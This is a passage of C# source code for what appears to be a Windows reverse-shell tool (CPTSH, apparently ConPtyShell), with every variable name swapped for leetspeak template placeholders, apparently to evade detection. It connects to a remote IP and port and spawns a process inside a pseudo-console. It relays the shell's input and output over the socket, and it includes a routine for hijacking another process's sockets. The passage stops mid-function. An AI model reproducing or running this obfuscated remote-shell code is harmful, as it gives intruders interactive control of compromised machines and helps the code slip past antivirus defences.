        if ((${c0nt3xtD4t4}.SharedData.CreationFlags & ${WSAFL4G0V3RL4PP3D}) != 0) ${r3t} = true;
        return ${r3t};
    }

    public static IntPtr DuplicateTargetProcessSocket(Process ${t4rg3tPr0c355}, ref bool ${0v3rl4pp3dS0ck3t})
    {
        IntPtr ${t4rg3tS0ck3tH4ndl3} = IntPtr.Zero;
        List<IntPtr> ${t4rg3tPr0c355S0ck3t5} = GetSocketsTargetProcess(${t4rg3tPr0c355});
        if (${t4rg3tPr0c355S0ck3t5}.Count < 1) return ${t4rg3tS0ck3tH4ndl3};
        else
        {
            foreach (IntPtr ${s0ck3tH4ndl3} in ${t4rg3tPr0c355S0ck3t5})
            {
                if (!IsSocketOverlapped(${s0ck3tH4ndl3}))
                {
                    continue;
                }
                ${t4rg3tS0ck3tH4ndl3} = ${s0ck3tH4ndl3};
                ${0v3rl4pp3dS0ck3t} = true;
                break;
            }
            if (${t4rg3tS0ck3tH4ndl3} == IntPtr.Zero) {
                foreach (IntPtr ${s0ck3tH4ndl3} in ${t4rg3tPr0c355S0ck3t5})
                {
                    ${t4rg3tS0ck3tH4ndl3} = ${s0ck3tH4ndl3};
                    if (!IsSocketOverlapped(${t4rg3tS0ck3tH4ndl3})) ${0v3rl4pp3dS0ck3t} = false;
                    break;
                }
            }
        }
        if (${t4rg3tS0ck3tH4ndl3} == IntPtr.Zero)
            throw new CPTSHException("No sockets found, so no hijackable sockets :( Exiting...");
        return ${t4rg3tS0ck3tH4ndl3};
    }
    public static void SetSocketBlockingMode(IntPtr ${s0ck3t}, int ${m0d3})
    {
        int ${F10NB10} = -2147195266;
        int ${N0nBl0ck1ngM0d3} = 1;
        int ${Bl0ck1ngM0d3} = 0;
        int ${r3sult};
        if (${m0d3} == 1)
            ${r3sult} = ioctlsocket(${s0ck3t}, ${F10NB10}, ref ${N0nBl0ck1ngM0d3});
        else
            ${r3sult} = ioctlsocket(${s0ck3t}, ${F10NB10}, ref ${Bl0ck1ngM0d3});
        if (${r3sult} == -1)
            throw new CPTSHException("ioctlsocket failed with return code " + ${r3sult}.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}

[StructLayout(LayoutKind.Sequential)]
public struct ParentProcessUtilities
{
    internal IntPtr Reserved1;
    internal IntPtr PebBaseAddress;
    internal IntPtr Reserved2_0;
    internal IntPtr Reserved2_1;
    internal IntPtr UniqueProcessId;
    internal IntPtr InheritedFromUniqueProcessId;

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr ${pr0c355H4ndl3}, int ${pr0c3551nf0rm4t10nCl455}, ref ParentProcessUtilities ${pr0c3551nf0rm4t10n}, int ${pr0c3551nf0rm4t10nL3ngth}, out int ${r3turnL3ngth});

    public static Process GetParentProcess()
    {
        return GetParentProcess(Process.GetCurrentProcess().Handle);
    }

    public static Process GetParentProcess(int ${1d})
    {
        Process ${pr0c355} = Process.GetProcessById(${1d});
        return GetParentProcess(${pr0c355}.Handle);
    }

    public static Process GetParentProcess(IntPtr ${h4ndl3})
    {
        ParentProcessUtilities ${pb1} = new ParentProcessUtilities();
        int ${r3turnL3ngth};
        int ${st4tu5} = NtQueryInformationProcess(${h4ndl3}, 0, ref ${pb1}, Marshal.SizeOf(${pb1}), out ${r3turnL3ngth});
        if (${st4tu5} != 0)
            throw new CPTSHException(${st4tu5}.ToString());
        try
        {
            return Process.GetProcessById(${pb1}.InheritedFromUniqueProcessId.ToInt32());
        }
        catch (ArgumentException)
        {
            return null;
        }
    }
}

public static class CPTSH
{
    private const string ${3rr0rStr1ng} = "{{{CPTSHException}}}\r\n";
    private const uint ${3N4BL3V1RTU4LT3RM1N4LPR0C3551NG} = 0x0004;
    private const uint ${D1S4BL3N3WL1N34UT0R3TURN} = 0x0008;
    private const uint ${PR0CTHR34D4TTR1BUT3P53UD0C0NS0L3} = 0x00020016;
    private const uint ${3XT3ND3DST4RTUP1NF0PR3S3NT} = 0x00080000;
    private const int ${ST4RTFUS3STDH4NDL35} = 0x00000100;
    private const int ${BUFF3RS1Z3P1P3} = 1048576;
    private const int ${WSAFL4G0V3RL4PP3D} = 0x1;
    private const UInt32 ${1NF1N1T3} = 0xFFFFFFFF;
    private const int ${SWH1D3} = 0;
    private const uint ${G3N3R1CR34D} = 0x80000000;
    private const uint ${G3N3R1CWR1T3} = 0x40000000;
    private const uint ${F1L3SH4R3R34D} = 0x00000001;
    private const uint ${F1L3SH4R3WR1T3} = 0x00000002;
    private const uint ${F1L34TTR1BUT3N0RM4L} = 0x80;
    private const uint ${0P3N3X1ST1NG} = 3;
    private const int ${STD1NPUTH4NDL3} = -10;
    private const int ${STD0UTPUTH4NDL3} = -11;
    private const int ${STD3RR0RH4NDL3} = -12;
    private const int ${WSA3WOULDBL0CK} = 10035;
    private const int ${FDR34D} = (1 << 0);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct COORD
    {
        public short X;
        public short Y;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr ${lp4ttr1but3L1st}, int ${dw4ttr1but3C0unt}, int ${dwFl4g5}, ref IntPtr ${lpS1z3});

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(IntPtr ${lp4ttr1but3L1st}, uint ${dwFl4g5}, IntPtr ${4ttr1but3}, IntPtr ${lpV4lu3}, IntPtr ${cbS1z3}, IntPtr ${lpPr3v10usV4lu3}, IntPtr ${lpR3turnS1z3});

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateProcessEx(string ${lp4pp1ic4t10nN4m3}, string ${lpC0mm4ndL1n3}, ref SECURITY_ATTRIBUTES ${lpPr0c3554ttr1but35}, ref SECURITY_ATTRIBUTES ${lpThr34d4ttr1but35}, bool ${b1nh3r1tH4ndl35}, uint ${dwCr34t10nFl4g5}, IntPtr ${lp3nv1r0nm3nt}, string ${lpCurr3ntD1r3ct0ry}, [In] ref STARTUPINFOEX ${lpSt4rtup1nf0}, out PROCESS_INFORMATION ${lpPr0c3551nf0rm4t10n});

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
    private static extern bool CreateProcess(string ${lp4pp1ic4t10nN4m3}, string ${lpC0mm4ndL1n3}, IntPtr ${lpPr0c3554ttr1but35}, IntPtr ${lpThr34d4ttr1but35}, bool ${b1nh3r1tH4ndl35}, uint ${dwCr34t10nFl4g5}, IntPtr ${lp3nv1r0nm3nt}, string ${lpCurr3ntD1r3ct0ry}, [In] ref STARTUPINFO ${lpSt4rtup1nf0}, out PROCESS_INFORMATION ${lpPr0c3551nf0rm4t10n});

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool TerminateProcess(IntPtr ${hPr0c355}, uint ${u3x1tC0d3});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr ${hH4ndl3}, UInt32 ${dwM1ll153c0nd5});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetStdHandle(int ${nStdH4ndl3}, IntPtr ${hH4ndl3});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetStdHandle(int ${nStdH4ndl3});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr ${h0bj3ct});

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr ${hR34dP1p3}, out IntPtr ${hWr1t3P1p3}, ref SECURITY_ATTRIBUTES ${lpP1p34ttr1but35}, int ${nS1z3});

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    private static extern IntPtr CreateFile(string ${lpF1l3N4m3}, uint ${dwD351r3d4cc355}, uint ${dwSh4r3M0d3}, IntPtr ${S3cur1ty4ttr1but35}, uint ${dwCr34t10nD1sp0s1t10n}, uint ${dwFl4g54nd4ttr1but35}, IntPtr ${hT3mpl4t3F1l3});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr ${hF1l3}, [Out] byte[] ${lpBuff3r}, uint ${nNum83r0fByt35T0R34d}, out uint ${lpNum83r0fByt35R34d}, IntPtr ${lp0v3rl4pp3d});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteFile(IntPtr ${hF1l3}, byte[] ${lpBuff3r}, uint ${nNum83r0fByt35T0Wr1t3}, out uint ${lpNum83r0fByt35Wr1tt3n}, IntPtr ${lp0v3rl4pp3d});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int CreatePseudoConsole(COORD ${s1z3}, IntPtr ${h1nput}, IntPtr ${h0utput}, uint ${dwFl4g5}, out IntPtr ${phPC});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int ClosePseudoConsole(IntPtr ${hPC});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetConsoleMode(IntPtr ${hC0ns0l3H4ndl3}, uint ${m0d3});

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetConsoleMode(IntPtr ${h4ndl3}, out uint ${m0d3});

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AllocConsole();

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern bool FreeConsole();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr ${hWnd}, int ${nCmdSh0w});

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr GetModuleHandle(string ${lpM0dul3N4m3});

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr ${hM0dul3}, string ${pr0cN4m3});

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr WSASocket([In] AddressFamily ${4ddr355F4m1ly}, [In] SocketType ${s0ck3tTyp3}, [In] ProtocolType ${pr0t0c0lTyp3}, [In] IntPtr ${pr0t0c0l1nf0}, [In] uint ${gr0up}, [In] int ${fl4g5});

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern int connect(IntPtr ${5}, ref SOCKADDR_IN ${4ddr}, int ${4ddrs1z3});

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern ushort htons(ushort ${h0stsh0rt});

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern uint inet_addr(string ${cp});

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern Int32 WSAStartup(Int16 ${wV3rs10nR3qu3st3d}, out WSAData ${ws4D4t4});

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr ${5});

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int recv(IntPtr ${S0ck3t}, byte[] ${buf}, int ${l3n}, uint ${fl4g5});

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int send(IntPtr ${S0ck3t}, byte[] ${buf}, int ${l3n}, uint ${fl4g5});

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr WSACreateEvent();

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAEventSelect(IntPtr ${5}, IntPtr ${h3v3nt0bj3ct}, int ${lN3tw0rk3v3nt5});

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAWaitForMultipleEvents(int ${c3v3nt5}, IntPtr[] ${lph3v3nt5}, bool ${fW41t4ll}, int ${dwT1m30ut}, bool ${f4l3rt4bl3});

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSAResetEvent(IntPtr ${h3v3nt});

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSACloseEvent(IntPtr ${h3v3nt});

    [DllImport("ntdll.dll")]
    private static extern uint NtSuspendProcess(IntPtr ${pr0c355H4ndl3});

    [DllImport("ntdll.dll")]
    private static extern uint NtResumeProcess(IntPtr ${pr0c355H4ndl3});

    private static void InitWSAThread()
    {
        WSAData ${d4t4};
        if (WSAStartup(2 << 8 | 2, out ${d4t4}) != 0)
            throw new CPTSHException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }

    private static IntPtr connectRemote(string ${r3m0t31p}, int ${r3m0t3P0rt})
    {
        int ${p0rt} = 0;
        int ${3rr0r} = 0;
        string ${h0st} = ${r3m0t31p};

        try
        {
            ${p0rt} = Convert.ToInt32(${r3m0t3P0rt});
        }
        catch
        {
            throw new CPTSHException("Specified port is invalid: " + ${r3m0t3P0rt}.ToString());
        }

        IntPtr ${s0ck3t} = IntPtr.Zero;
        ${s0ck3t} = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, ${WSAFL4G0V3RL4PP3D});
        SOCKADDR_IN ${s0ck1nf0} = new SOCKADDR_IN();
        ${s0ck1nf0}.sin_family = (short)2;
        ${s0ck1nf0}.sin_addr = inet_addr(${h0st});
        ${s0ck1nf0}.sin_port = (short)htons((ushort)${p0rt});

        if (connect(${s0ck3t}, ref ${s0ck1nf0}, Marshal.SizeOf(${s0ck1nf0})) != 0)
        {
            ${3rr0r} = WSAGetLastError();
            throw new CPTSHException(String.Format("WSAConnect failed with error code: {0}", ${3rr0r}));
        }

        return ${s0ck3t};
    }

    private static void TryParseRowsColsFromSocket(IntPtr ${sh3llS0ck3t}, ref uint ${r0w5}, ref uint ${c0l5})
    {
        Thread.Sleep(500);
        byte[] ${r3c31v3d} = new byte[100];
        int ${r0w5T3mp}, ${c0l5T3mp};
        int ${byt35R3c31v3d} = recv(${sh3llS0ck3t}, ${r3c31v3d}, 100, 0);
        try
        {
            string ${s1z3R3c31v3d} = Encoding.ASCII.GetString(${r3c31v3d}, 0, ${byt35R3c31v3d});
            string ${r0w5Str1ng} = ${s1z3R3c31v3d}.Split(' ')[0].Trim();
            string ${c0l5Str1ng} = ${s1z3R3c31v3d}.Split(' ')[1].Trim();
            if (Int32.TryParse(${r0w5Str1ng}, out ${r0w5T3mp}) && Int32.TryParse(${c0l5Str1ng}, out ${c0l5T3mp}))
            {
                ${r0w5} = (uint)${r0w5T3mp};
                ${c0l5} = (uint)${c0l5T3mp};
            }
        }
        catch
        {
            return;
        }
    }

    private static void CreatePipes(ref IntPtr ${1nputP1p3R34d}, ref IntPtr ${1nputP1p3Wr1t3}, ref IntPtr ${0utputP1p3R34d}, ref IntPtr ${0utputP1p3Wr1t3})
    {
        SECURITY_ATTRIBUTES ${pS3c} = new SECURITY_ATTRIBUTES();
        ${pS3c}.nLength = Marshal.SizeOf(${pS3c});
        ${pS3c}.bInheritHandle = 1;
        ${pS3c}.lpSecurityDescriptor = IntPtr.Zero;
        if (!CreatePipe(out ${1nputP1p3R34d}, out ${1nputP1p3Wr1t3}, ref ${pS3c}, ${BUFF3RS1Z3P1P3}))
            throw new CPTSHException("Could not create the InputPipe");
        if (!CreatePipe(out ${0utputP1p3R34d}, out ${0utputP1p3Wr1t3}, ref ${pS3c}, ${BUFF3RS1Z3P1P3}))
            throw new CPTSHException("Could not create the OutputPipe");
    }

    private static void InitConsole(ref IntPtr ${0ldStd1n}, ref IntPtr ${0ldStd0ut}, ref IntPtr ${0ldStd3rr})
    {
        ${0ldStd1n} = GetStdHandle(${STD1NPUTH4NDL3});
        ${0ldStd0ut} = GetStdHandle(${STD0UTPUTH4NDL3});
        ${0ldStd3rr} = GetStdHandle(${STD3RR0RH4NDL3});
        IntPtr ${hStd0ut} = CreateFile("CONOUT$", ${G3N3R1CR34D} | ${G3N3R1CWR1T3}, ${F1L3SH4R3R34D} | ${F1L3SH4R3WR1T3}, IntPtr.Zero, ${0P3N3X1ST1NG}, ${F1L34TTR1BUT3N0RM4L}, IntPtr.Zero);
        IntPtr ${hStd1n} = CreateFile("CONIN$", ${G3N3R1CR34D} | ${G3N3R1CWR1T3}, ${F1L3SH4R3R34D} | ${F1L3SH4R3WR1T3}, IntPtr.Zero, ${0P3N3X1ST1NG}, ${F1L34TTR1BUT3N0RM4L}, IntPtr.Zero);
        SetStdHandle(${STD0UTPUTH4NDL3}, ${hStd0ut});
        SetStdHandle(${STD3RR0RH4NDL3}, ${hStd0ut});
        SetStdHandle(${STD1NPUTH4NDL3}, ${hStd1n});
    }

    private static void RestoreStdHandles(IntPtr ${0ldStd1n}, IntPtr ${0ldStd0ut}, IntPtr ${0ldStd3rr})
    {
        SetStdHandle(${STD0UTPUTH4NDL3}, ${0ldStd0ut});
        SetStdHandle(${STD3RR0RH4NDL3}, ${0ldStd3rr});
        SetStdHandle(${STD1NPUTH4NDL3}, ${0ldStd1n});
    }

    private static void EnableVirtualTerminalSequenceProcessing()
    {
        uint ${0utC0ns0l3M0d3} = 0;
        IntPtr ${hStd0ut} = GetStdHandle(${STD0UTPUTH4NDL3});
        if (!GetConsoleMode(${hStd0ut}, out ${0utC0ns0l3M0d3}))
        {
            throw new CPTSHException("Could not get console mode");
        }
        ${0utC0ns0l3M0d3} |= ${3N4BL3V1RTU4LT3RM1N4LPR0C3551NG} | ${D1S4BL3N3WL1N34UT0R3TURN};
        if (!SetConsoleMode(${hStd0ut}, ${0utC0ns0l3M0d3}))
        {
            throw new CPTSHException("Could not enable virtual terminal processing");
        }
    }

    private static int CreatePseudoConsoleWithPipes(ref IntPtr ${h4ndl3P53ud0C0ns0l3}, ref IntPtr ${C0nPty1nputP1p3R34d}, ref IntPtr ${C0nPty0utputP1p3Wr1t3}, uint ${r0w5}, uint ${c0l5})
    {
        int ${r3sult} = -1;
        EnableVirtualTerminalSequenceProcessing();
        COORD ${c0ns0l3C00rd} = new COORD();
        ${c0ns0l3C00rd}.X = (short)${c0l5};
        ${c0ns0l3C00rd}.Y = (short)${r0w5};
        ${r3sult} = CreatePseudoConsole(${c0ns0l3C00rd}, ${C0nPty1nputP1p3R34d}, ${C0nPty0utputP1p3Wr1t3}, 0, out ${h4ndl3P53ud0C0ns0l3});
        return ${r3sult};
    }

    private static STARTUPINFOEX ConfigureProcessThread(IntPtr ${h4ndl3P53ud0C0ns0l3}, IntPtr ${4ttr1but35})
    {
        IntPtr ${lpS1z3} = IntPtr.Zero;
        bool ${succ355} = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref ${lpS1z3});
        if (${succ355} || ${lpS1z3} == IntPtr.Zero)
        {
            throw new CPTSHException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        STARTUPINFOEX ${st4rtup1nf0} = new STARTUPINFOEX();
        ${st4rtup1nf0}.StartupInfo.cb = Marshal.SizeOf(${st4rtup1nf0});
        ${st4rtup1nf0}.lpAttributeList = Marshal.AllocHGlobal(${lpS1z3});
        ${succ355} = InitializeProcThreadAttributeList(${st4rtup1nf0}.lpAttributeList, 1, 0, ref ${lpS1z3});
        if (!${succ355})
        {
            throw new CPTSHException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        ${succ355} = UpdateProcThreadAttribute(${st4rtup1nf0}.lpAttributeList, 0, ${4ttr1but35}, ${h4ndl3P53ud0C0ns0l3}, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
        if (!${succ355})
        {
            throw new CPTSHException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return ${st4rtup1nf0};
    }

    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX ${s1nf0Ex}, string ${c0mm4ndL1n3})
    {
        PROCESS_INFORMATION ${p1nf0} = new PROCESS_INFORMATION();
        SECURITY_ATTRIBUTES ${pS3c} = new SECURITY_ATTRIBUTES();
        int ${s3cur1ty4ttr1but3S1z3} = Marshal.SizeOf(${pS3c});
        ${pS3c}.nLength = ${s3cur1ty4ttr1but3S1z3};
        SECURITY_ATTRIBUTES ${tS3c} = new SECURITY_ATTRIBUTES();
        ${tS3c}.nLength = ${s3cur1ty4ttr1but3S1z3};
        bool ${succ355} = CreateProcessEx(null, ${c0mm4ndL1n3}, ref ${pS3c}, ref ${tS3c}, false, ${3XT3ND3DST4RTUP1NF0PR3S3NT}, IntPtr.Zero, null, ref ${s1nf0Ex}, out ${p1nf0});
        if (!${succ355})
        {
            throw new CPTSHException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return ${p1nf0};
    }

    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr ${h4ndl3P53ud0C0ns0l3}, string ${c0mm4ndL1n3})
    {
        STARTUPINFOEX ${st4rtup1nf0} = ConfigureProcessThread(${h4ndl3P53ud0C0ns0l3}, (IntPtr)${PR0CTHR34D4TTR1BUT3P53UD0C0NS0L3});
        PROCESS_INFORMATION ${pr0c3551nf0} = RunProcess(ref ${st4rtup1nf0}, ${c0mm4ndL1n3});
        return ${pr0c3551nf0};
    }

    private static void ThreadReadPipeWriteSocketOverlapped(object ${thr34dP4r4m5})
    {
        object[] ${thr34dP4r4m3t3r5} = (object[])${thr34dP4r4m5};
        IntPtr ${0utputP1p3R34d} = (IntPtr)${thr34dP4r4m3t3r5}[0];
        IntPtr ${sh3llS0ck3t} = (IntPtr)${thr34dP4r4m3t3r5}[1];
        int ${buff3rS1z3} = 8192;
        bool ${r34dSucc355} = false;
        Int32 ${byt35S3nt} = 0;
        uint ${dwByt35R34d} = 0;
        do
        {
            byte[] ${byt35T0Wr1t3} = new byte[${buff3rS1z3}];
            ${r34dSucc355} = ReadFile(${0utputP1p3R34d}, ${byt35T0Wr1t3}, (uint)${buff3rS1z3}, out ${dwByt35R34d}, IntPtr.Zero);
            ${byt35S3nt} = send(${sh3llS0ck3t}, ${byt35T0Wr1t3}, (int)${dwByt35R34d}, 0);
        } while (${byt35S3nt} > 0 && ${r34dSucc355});
    }

    private static void ThreadReadPipeWriteSocketNonOverlapped(object ${thr34dP4r4m5})
    {
        object[] ${thr34dP4r4m3t3r5} = (object[])${thr34dP4r4m5};
        IntPtr ${0utputP1p3R34d} = (IntPtr)${thr34dP4r4m3t3r5}[0];
        IntPtr ${sh3llS0ck3t} = (IntPtr)${thr34dP4r4m3t3r5}[1];
        int ${buff3rS1z3} = 8192;
        bool ${r34dSucc355} = false;
        Int32 ${byt35S3nt} = 0;
        uint ${dwByt35R34d} = 0;
        do
        {
            byte[] ${byt35T0Wr1t3} = new byte[${buff3rS1z3}];
            ${r34dSucc355} = ReadFile(${0utputP1p3R34d}, ${byt35T0Wr1t3}, (uint)${buff3rS1z3}, out ${dwByt35R34d}, IntPtr.Zero);
            do
            {
                ${byt35S3nt} = send(${sh3llS0ck3t}, ${byt35T0Wr1t3}, (int)${dwByt35R34d}, 0);
            } while (WSAGetLastError() == ${WSA3WOULDBL0CK});
        } while (${byt35S3nt} > 0 && ${r34dSucc355});
    }

    private static Thread StartThreadReadPipeWriteSocket(IntPtr ${0utputP1p3R34d}, IntPtr ${sh3llS0ck3t}, bool ${0v3rl4pp3dS0ck3t})
    {
        object[] ${thr34dP4r4m3t3r5} = new object[2];
        ${thr34dP4r4m3t3r5}[0] = ${0utputP1p3R34d};
        ${thr34dP4r4m3t3r5}[1] = ${sh3llS0ck3t};
        Thread ${thThr34dR34dP1p3Wr1t3S0ck3t};
        if(${0v3rl4pp3dS0ck3t})
            ${thThr34dR34dP1p3Wr1t3S0ck3t} = new Thread(ThreadReadPipeWriteSocketOverlapped);
        else
            ${thThr34dR34dP1p3Wr1t3S0ck3t} = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
        ${thThr34dR34dP1p3Wr1t3S0ck3t}.Start(${thr34dP4r4m3t3r5});
        return ${thThr34dR34dP1p3Wr1t3S0ck3t};
    }

    private static void ThreadReadSocketWritePipeOverlapped(object ${thr34dP4r4m5})
    {
        object[] ${thr34dP4r4m3t3r5} = (object[])${thr34dP4r4m5};
        IntPtr ${1nputP1p3Wr1t3} = (IntPtr)${thr34dP4r4m3t3r5}[0];
        IntPtr ${sh3llS0ck3t} = (IntPtr)${thr34dP4r4m3t3r5}[1];
        IntPtr ${hCh1ldPr0c355} = (IntPtr)${thr34dP4r4m3t3r5}[2];
        int ${buff3rS1z3} = 8192;
        bool ${wr1t3Succ355} = false;
        Int32 ${nByt35R3c31v3d} = 0;
        uint ${byt35Wr1tt3n} = 0;
        do
        {
            byte[] ${byt35R3c31v3d} = new byte[${buff3rS1z3}];
            ${nByt35R3c31v3d} = recv(${sh3llS0ck3t}, ${byt35R3c31v3d}, ${buff3rS1z3}, 0);
            ${wr1t3Succ355} = WriteFile(${1nputP1p3Wr1t3}, ${byt35R3c31v3d}, (uint)${nByt35R3c31v3d}, out ${byt35Wr1tt3n}, IntPtr.Zero);
        } while (${nByt35R3c31v3d} > 0 && ${wr1t3Succ355});
        TerminateProcess(${hCh1ldPr0c355}, 0);
    }

    private static void ThreadReadSocketWritePipeNonOverlapped(object ${thr34dP4r4m5})
    {
        object[] ${thr34dP4r4m3t3r5} = (object[])${thr34dP4r4m5};
        IntPtr ${1nputP1p3Wr1t3} = (IntPtr)${thr34dP4r4m3t3r5}[0];
        IntPtr ${sh3llS0ck3t} = (IntPtr)${thr34dP4r4m3t3r5}[1];
        IntPtr ${hCh1ldPr0c355} = (IntPtr)${thr34dP4r4m3t3r5}[2];
        int ${buff3rS1z3} = 8192;
        bool ${wr1t3Succ355} = false;
        Int32 ${nByt35R3c31v3d} = 0;
        uint ${byt35Wr1tt3n} = 0;
        bool ${s0ck3tBl0ck1ng0p3r4t10n} = false;
        IntPtr ${ws4R34d3v3nt} = WSACreateEvent();
        WSAEventSelect(${sh3llS0ck3t}, ${ws4R34d3v3nt}, ${FDR34D});
        IntPtr[] ${ws43v3nt54rr4y} = new IntPtr[] { ${ws4R34d3v3nt} };
        do
        {
            byte[] ${byt35R3c31v3d} = new byte[${buff3rS1z3}];
            WSAWaitForMultipleEvents(${ws43v3nt54rr4y}.Length, ${ws43v3nt54rr4y}, true, 500, false);
            ${nByt35R3c31v3d} = recv(${sh3llS0ck3t}, ${byt35R3c31v3d}, ${buff3rS1z3}, 0);
            if (WSAGetLastError() == ${WSA3WOULDBL0CK})
            {
                ${s0ck3tBl0ck1ng0p3r4t10n} = true;
                continue;
            }
            WSAResetEvent(${ws4R34d3v3nt});
            ${s0ck3tBl0ck1ng0p3r4t10n} = false;
            ${wr1t3Succ355} = WriteFile(${1nputP1p3Wr1t3}, ${byt35R3c31v3d}, (uint)${nByt35R3c31v3d}, out ${byt35Wr1tt3n}, IntPtr.Zero);
        } while (${s0ck3tBl0ck1ng0p3r4t10n} || (${nByt35R3c31v3d} > 0 && ${wr1t3Succ355}));
        WSACloseEvent(${ws4R34d3v3nt});
        TerminateProcess(${hCh1ldPr0c355}, 0);
    }

    private static Thread StartThreadReadSocketWritePipe(IntPtr ${1nputP1p3Wr1t3}, IntPtr ${sh3llS0ck3t}, IntPtr ${hCh1ldPr0c355}, bool ${0v3rl4pp3dS0ck3t})
    {
        object[] ${thr34dP4r4m3t3r5} = new object[3];
        ${thr34dP4r4m3t3r5}[0] = ${1nputP1p3Wr1t3};
        ${thr34dP4r4m3t3r5}[1] = ${sh3llS0ck3t};
        ${thr34dP4r4m3t3r5}[2] = ${hCh1ldPr0c355};
        Thread ${thR34dS0ck3tWr1t3P1p3};
        if(${0v3rl4pp3dS0ck3t})
            ${thR34dS0ck3tWr1t3P1p3} = new Thread(ThreadReadSocketWritePipeOverlapped);
        else
            ${thR34dS0ck3tWr1t3P1p3} = new Thread(ThreadReadSocketWritePipeNonOverlapped);
        ${thR34dS0ck3tWr1t3P1p3}.Start(${thr34dP4r4m3t3r5});
        return ${thR34dS0ck3tWr1t3P1p3};
    }

    public static string SpawnCPTSH(string ${r3m0t31p}, int ${r3m0t3P0rt}, uint ${r0w5}, uint ${c0l5}, string ${c0mm4ndL1n3}, bool ${upgr4d3Sh3ll})
    {
        IntPtr ${sh3llS0ck3t} = IntPtr.Zero;
